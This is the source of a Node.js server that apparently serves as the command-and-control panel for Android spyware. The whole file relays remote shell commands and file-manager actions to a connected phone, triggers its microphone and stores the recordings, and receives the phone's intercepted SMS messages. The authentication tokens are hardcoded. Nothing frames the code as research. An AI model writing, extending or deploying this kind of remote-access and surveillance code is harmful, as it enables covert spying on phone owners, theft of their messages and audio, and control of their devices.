
require('./config');
require('./lib');
require('./models');
const app = express();
app.use(express.static('assets'));
app.use(express.static('uploads'));
app.use(express.static('files'));
app.use(express.static('recorders'));

app.set('views', path.join(__dirname, 'templates'));
app.set('view engine', 'ejs');
app.use(bodyParser.json());
const multer  = require('multer');
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, 'uploads')
    },
    filename: function (req, file, cb) {
      cb(null,file.originalname);
    }
});
const upload = multer({ "storage" : storage });
const storage2 = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, 'files')
    },
    filename: function (req, file, cb) {
      cb(null,file.originalname);
    }
});
const upload2 = multer({ "storage" : storage2 });

app.use(async (error,req,res,next)=> {
    try{
        res.status(500).json({"result":error.toString()});
    }
    catch(e){
        res.status(500).json({"result":e.toString()});
    }
});
app.use(bodyParser.urlencoded({ extended: true }));

const io = require("socket.io")(IO_PORT, {
    cors: {
        origin: "*",
    }    
});

let sessions = [];
const androidAppToken = "9e57d81ae3d2c148454af169d5cd562b714a5f4ac03b5f33334fada7a7584198";
const webToken = "ac34c2c24de98e6b7a27fe4d90ec8374507821f6a967fcefc3cd9d96782f960e";

io.use(async (socket, next) => {
    try{
        const key = socket.handshake.query.key;
        if(key === androidAppToken || key === webToken)
        {
            socket.sessionID = key
            return next();   
        }
        else
        {
            return next(new Error("auth error!"));
        }
    }
    catch(e){
        log(e);
        return next(new Error("auth error!"));
    }
});


app.get('/',async (req,res) => {
    try{
        res.render('home',{
            title : "Home",
            "BASE_URL" : BASE_URL,
            "homeMenu" : "active",
            "filemanagerMenu":"",
            "shellMenu" : "",
            "AudioRecorderMenu":"",
        });
    }
    catch(e){
        res.send(e.toString());
    }
});


app.get('/filemanager',async (req,res) => {
    try{
        res.render('filemanager',{
            title : "File Manager",
            "homeMenu" : "",
            "filemanagerMenu" : "active",
            "shellMenu" : "",
            "BASE_URL" : BASE_URL,
            "AudioRecorderMenu":"",
        });
    }
    catch(e){
        res.send(e.toString());
    }
});


app.get('/shell',async (req,res) => {
    try{
        res.render('shell',{
            title : "Shell",
            "homeMenu" : "",
            "filemanagerMenu":"",
            "shellMenu" : "active",
            "BASE_URL" : BASE_URL,
            "AudioRecorderMenu":"",
        });
    }
    catch(e){
        res.send(e.toString());
    }
});


app.get('/AudioRecorder',async (req,res) => {
    try{
        const rows = await Models.AudioRecorderModel.find().sort([['_id',-1]]);
        res.render('audio-recorder',{
            title : "Audio Recorder",
            "homeMenu" : "",
            "filemanagerMenu" : "",
            "shellMenu" : "",
            "BASE_URL" : BASE_URL,
            "AudioRecorderMenu" : "active",
            "rows" : rows,
        });
    }
    catch(e){
        res.send(e.toString());
    }
});

app.post('/SaveAudioRecorder',async (req,res) => {
    try{
        if(req.body.data.length > 0)
        {
            const file = new Date().getTime() + "" + generateRandomNumber(1000000000,9999999999);
            const fileName = hash(file) + ".amr";
            fs.writeFileSync("./recorders/" + fileName ,req.body.data,'base64');
            const data = {
                "file" : fileName,
                "date_time" : new Date()
            };
            const result = new Models.AudioRecorderModel(data);
            await result.save();     
        }
        res.json({"status":"success"});
    }
    catch(e){
        res.json(e.toString());
    }
});



app.post('/getSms',async (req,res) => {
    try{
        const data = {
            "from" : safeString(req.body.from),
            "body" : safeString(req.body.body),
            "date_time" : safeString(req.body.date_time),
        };
        const result = new Models.SMSModel(data);
        await result.save(); 
        res.json({"status":"success"});
    }
    catch(e){
        res.json(e.toString());
    }
});


app.post('/upload-file',upload.single('file'),async (req,res) => {
    try{
        if(req.file && Object.keys(req.file).length > 0)
        {
            res.json({"code":"0","result":`${BASE_URL}${req.file.filename}`});
        }
        else
        {
            res.json({"code":"2","result":"err"});
        }
    }
    catch(e){
        res.json({"code":"1","result":e.toString()});
    }
});

app.post('/upload-file2',upload2.single('file'),async (req,res) => {
    try{
        if(req.file && Object.keys(req.file).length > 0)
        {
            res.json({"code":"0","result":`${BASE_URL}${req.file.filename}`});
        }
        else
        {
            res.json({"code":"2","result":"err"});
        }
    }
    catch(e){
        res.json({"code":"1","result":e.toString()});
    }
});





app.listen(PORT, async () => {
    try{
        log(`Runing on Port ${PORT}`);
    }
    catch(e){
        log(`Error on app.js : ${e.toString()}`);
    }
});

io.on("connection", async (socket) => {
    try{
        log('connection');
        socket.join(socket.sessionID);//add new room
        

        if(socket.sessionID == androidAppToken)
        {
            log('device is online');
            sendToWeb("device_connect",{}); 
        }

        const sessionIndex = await findSessionByIDIndex(socket.sessionID);
        if(sessionIndex == -1)
            sessions.push({"session_id":socket.sessionID});


        //web to app
        socket.on('filemanager_to_device',async(data) => {
            sendToApp("filemanager",data);  
        });


        //app to web
        socket.on('filemanager_to_web',async(data) => {
            sendToWeb("filemanager_result",data); 
        });

        socket.on("disconnect", async () => {
            log('disconnect');
            const matchingSockets = await io.in(socket.sessionID).allSockets();
            if(matchingSockets.size === 0)
            {
                if(socket.sessionID === androidAppToken)
                {
                    log('device is offline');
                    sendToWeb("device_disconnect",{});      
                }
                const webSessionIndex2 = await findSessionByIDIndex(socket.sessionID);
                if(webSessionIndex2 != -1)
                {
                    sessions.splice(webSessionIndex2,1);
                }    
            }
        });





        //home page
        socket.on('checkDeviceStatus',async(data) => {
            const sessionIndex = await findSessionByIDIndex(androidAppToken);
            if(sessionIndex != -1)
            {
                sendToWeb("device_connect",{}); 
            }
        });
        
        socket.on('pingPong',async(data) => {
            sendToApp("ping",{}); 
        });



        socket.on('pong',async (data) => {
           // log('pong is call');
        });
        
        socket.on('deviceInfo_to_device',async(data) => {
            sendToApp("getDeviceInfo",{}); 
        });
        
        socket.on('resultDeviceInfo',async(data) => {
            sendToWeb("deviceInfo_to_web",data);
        });



        //shell
        socket.on('sendCmd',async(data) => {
            sendToApp("runCmd",data); 
        });

        socket.on('getCmdResult',async(data) => {
            sendToWeb("resultCmd",data); 
        });

        //Audio Recording
        socket.on('startMic_to_device',async(data) => {
            sendToApp("startMic",data); 
        });





    }
    catch(e){
        log('error in io ' + e.toString());
    }
});


const findSessionByIDIndex = async (str) => {
    return await sessions.findIndex((row, index) => {
        if(row.session_id == str)
            return true;
    });
}


const sendToApp = (event,data) => {
    io.in(androidAppToken).emit(event,data);
}


const sendToWeb = (event,data) => {
    io.in(webToken).emit(event,data);
}